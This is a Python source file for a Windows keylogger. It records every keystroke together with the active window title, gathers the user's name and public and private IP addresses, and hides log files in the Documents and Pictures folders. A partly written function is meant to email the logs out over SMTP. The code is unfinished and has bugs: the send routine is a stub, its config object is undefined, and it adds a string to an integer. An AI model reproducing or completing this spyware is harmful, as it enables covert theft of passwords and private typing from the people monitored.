"""
Working on python 3.6.5
Need to be installed: pynput, requests, win32gui, pywin32
"""
from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def on_press(key):
    global old_app

    """Finding the window that is currently used"""
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows start menu'
    else:
        pass
    
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
            'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
    
    key = str(key).strip('\'')

    if key in substitution:
        logged_data.append(substitution[substitution.index(key)+1])
    else:
        logged_data.append(key)

    """temporary print to print pressed keys"""    
    print(key)


def write_file(count):
    one = os.path.expanduser('~') + '/Documents/'
    two = os.path.expanduser('~') + '/Pictrues/'

    list = [one, two]

    filepath = random.choice(list)

    """counting logs"""
    filename = str(count) + 'I' + random.randint(1000000, 9999999) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))

    def send_logs():
        count = 0 

        fromAddr = config.fromAddr
        fromPswd = config.fromPswd
        toAddr = fromAddr

        MIN = 10
        SECONDS = 60

        time.sleep(10)
        while True:
            if len(logged_data) > 1:
                pass

"""temporary function to stop listening when esc is pressed"""
def on_release(key):
    if key == Key.esc:
        return False

"""keyboard listener"""
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
